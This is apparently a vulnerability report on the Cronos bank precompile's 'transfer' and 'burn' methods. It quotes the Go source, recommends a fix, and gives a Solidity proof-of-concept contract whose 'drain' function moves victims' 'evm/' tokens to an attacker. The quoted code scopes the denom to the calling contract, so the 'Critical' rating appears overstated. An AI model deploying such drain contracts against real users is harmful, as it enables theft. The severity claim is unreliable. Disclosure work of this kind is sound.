### Title
Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Users' `evm/` Native Tokens Without Authorization - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract` precompile's `transfer` method accepts an arbitrary `sender` address as a call argument and uses `contract.Caller()` only to derive the token denom. There is no check that the calling contract is authorized to move tokens on behalf of the supplied `sender`. Any deployed contract can therefore drain any user's `evm/<contractAddress>` native Cosmos tokens to an attacker-controlled address in a single transaction.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `transfer` case of `BankContract.Run` reads the `sender` address directly from the ABI-decoded call arguments and passes it as the `from` address to `bankKeeper.SendCoins`:

```go
// lines 175-192
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())   // "evm/<callerContractAddress>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The denom is scoped to the calling contract (`evm/<callerAddress>`), but the `from` address is fully attacker-controlled. There is no assertion that `contract.Caller() == sender`, no allowance/approval check, and no other authorization guard.

The same pattern applies to the `burn` case: the address to burn from (`recipient` in the argument list) is also taken verbatim from call arguments with no ownership check. [2](#0-1) 

The `evm/<contractAddress>` denom is a real, spendable Cosmos-layer asset. Users acquire it by calling `bank.mint` from a contract (e.g., `TestBank.moveToNative` burns ERC20 tokens and mints the equivalent native `evm/` coins to the user's Cosmos account). [3](#0-2) 

### Impact Explanation
**Critical — unauthorized transfer of native Cosmos tokens.**

A malicious contract calls `bank.transfer(victim, attacker, victimBalance)`. The precompile resolves the denom as `evm/<maliciousContractAddress>`, then executes `bankKeeper.SendCoins(victim, attacker, amount)` with no consent from `victim`. All `evm/<maliciousContractAddress>` tokens held by any user are immediately transferable to the attacker. This is a direct, complete theft of Cosmos-layer assets with no recovery path.

The `burn` variant allows the same contract to destroy any user's `evm/<contractAddress>` balance, permanently destroying their assets.

### Likelihood Explanation
Any unprivileged actor can deploy a contract on Cronos EVM. The attack requires only:
1. Deploy a contract (no special permissions needed).
2. Attract users to hold `evm/<contractAddress>` native tokens (e.g., by offering a legitimate-looking ERC20↔native conversion service).
3. Call `bank.transfer(victim, attacker, amount)` — one transaction, no timelock, no governance, no admin key required.

The `bank` precompile is live at address `0x0000000000000000000000000000000000000064` and is reachable by any EVM contract. [4](#0-3) 

### Recommendation
In the `transfer` case, enforce that the calling contract is the authorized spender of the `sender`'s tokens. The minimal fix is to require `contract.Caller() == sender`:

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the token owner")
}
```

Similarly, in the `burn` case, require `contract.Caller() == recipient` (the address being burned from). This mirrors the design intent already present in `mint`, where the denom is scoped to the caller and the caller implicitly authorizes the mint on behalf of the recipient.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address token, address addr) external view returns (uint256);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Attract users — offer a "legitimate" service that mints evm/<this> tokens.
    // Users call depositForUser(), which mints evm/<address(this)> to their Cosmos account.
    function depositForUser(address user, uint256 amount) external {
        // (in practice: burn user's ERC20 first, then mint native)
        bank.mint(user, amount);
    }

    // Step 2: Attacker drains all users in one call.
    // No approval, no timelock, no admin key needed.
    function drain(address victim, address attacker) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // Transfers evm/<address(this)> from victim to attacker — no consent required.
        bank.transfer(victim, attacker, bal);
    }
}
```

1. Deploy `AttackerContract` on Cronos EVM.
2. Users call `depositForUser` (or any equivalent flow), acquiring `evm/<AttackerContract>` native tokens.
3. Attacker calls `drain(victim, attacker)` — `bankKeeper.SendCoins` executes immediately, moving all of `victim`'s `evm/<AttackerContract>` tokens to `attacker` with no authorization check. [1](#0-0)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L30-34)
```go
var (
	bankABI                 abi.ABI
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
)
```

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
